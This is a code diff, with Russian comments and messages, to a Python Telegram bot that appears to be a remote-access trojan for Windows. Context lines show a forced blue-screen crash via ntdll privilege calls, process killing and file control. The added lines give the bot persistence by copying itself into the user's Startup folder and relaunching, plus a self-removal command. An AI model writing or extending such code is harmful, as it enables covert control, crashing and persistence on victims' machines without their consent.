@@ -99,8 +99,9 @@ btn2 = types.KeyboardButton('/4\n>>')
 btn3 = types.KeyboardButton('/Files\n')
 btn4 = types.KeyboardButton('/Tasklist\n')
 btn5 = types.KeyboardButton('/Taskkill\n')
+btn6 = types.KeyboardButton('/Autorun\n')
 second_menu.row(btn1,btn3, btn2)
-second_menu.row(btn4, btn5)
+second_menu.row(btn4, btn6, btn5)
 
 ##############################
 # Подменю управления файлами
@@ -116,6 +117,17 @@ btn6 = types.KeyboardButton('/CancelFiles')
 files_submenu.row(btn1, btn2)
 files_submenu.row(btn3, btn4, btn5)
 files_submenu.row(btn6)
+
+##############################
+# Подменю управления автозапуском
+##############################
+autorun_submenu = types.ReplyKeyboardMarkup()
+btn1 = types.KeyboardButton('/Startup\n')
+btn2 = types.KeyboardButton('/Remove\n️')
+btn3 = types.KeyboardButton('/CancelMain')
+autorun_submenu.row(btn1)
+autorun_submenu.row(btn2)
+autorun_submenu.row(btn3)
 
 ##############################
 # ИСПОЛНЕНИЕ
@@ -346,7 +358,7 @@ def poweroff(command):
 def bsod(command):
     try:
         bot.send_chat_action(adm, 'typing')
-        bot.send_message(adm, '*BSoD Активирован! ✔️*', reply_markup=menu, parse_mode="Markdown")
+        bot.send_message(adm, '*BSoD Активирован!*', reply_markup=menu, parse_mode="Markdown")
         tmp1 = c_bool()
         tmp2 = DWORD()
         ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, byref(tmp1))
@@ -572,6 +584,57 @@ def taskkill(message):
         bot.send_message(adm, "Процесс *" + user_msg.split(" ")[1] + "* остановлен!", parse_mode="Markdown")
     except:
         bot.send_message(adm, '*Введите название процесса*\n \n/Taskkill', parse_mode="Markdown")
+
+
+
+#############################
+# Автозапуск
+#############################
+
+@bot.message_handler(commands=['Autorun', 'autorun'])
+def autorun(command):
+ bot.send_chat_action(adm, 'typing')
+ bot.send_message(adm, '*Выберите действие*', reply_markup=autorun_submenu, parse_mode="Markdown")
+
+#############################
+# Добавление в автозапуск
+#############################
+
+@bot.message_handler(commands=['Startup', 'startup'])
+def startup(commands):
+ bot.send_chat_action(adm, 'typing')
+ try:
+  shutil.copy2((sys.argv[0]), r'C:\\Users\\' + os.getlogin() + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup')
+  bot.send_message(adm, '*' + os.path.basename(sys.argv[0]) + ' скопирован в автозагрузку! *', parse_mode="Markdown")
+  os.startfile('C:\\Users\\' + os.getlogin() + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\' + os.path.basename(sys.argv[0]))
+  bot.send_message(adm, '*' + os.path.basename(sys.argv[0]) + ' запущен из автозагрузки! *', parse_mode="Markdown")
+  bot.send_message(adm, '*Завершаем текущий процесс...*', parse_mode="Markdown")
+ except:
+  bot.send_message(adm, '*Ошибка*', reply_markup=menu, parse_mode="Markdown")
+
+#############################
+# Удаление из автозапуска
+#############################
+
+@bot.message_handler(commands=['Remove', 'remove'])
+def remove(command):
+ try:
+  shutil.move(sys.argv[0], 'C:\\ProgramData')
+  bot.send_message(adm, '*' + os.path.basename(sys.argv[0]) + ' удален с компьютера! *', parse_mode="Markdown")
+  bot.send_message(adm, '*Завершаем текущий процесс...*', parse_mode="Markdown")
+  os.system('taskkill /im ' + os.path.basename(sys.argv[0]) + ' /f')
+ except:
+  bot.send_message(adm, '*Ошибка*', parse_mode="Markdown")
+
+#############################
+# Выход в меню
+#############################
+
+@bot.message_handler(commands=['CancelMain', 'cancelmain'])
+def cancel(command):
+ bot.send_chat_action(adm, 'typing')
+ bot.send_message(adm, 'ok', reply_markup=menu)
+
 
 #############################
 #############################
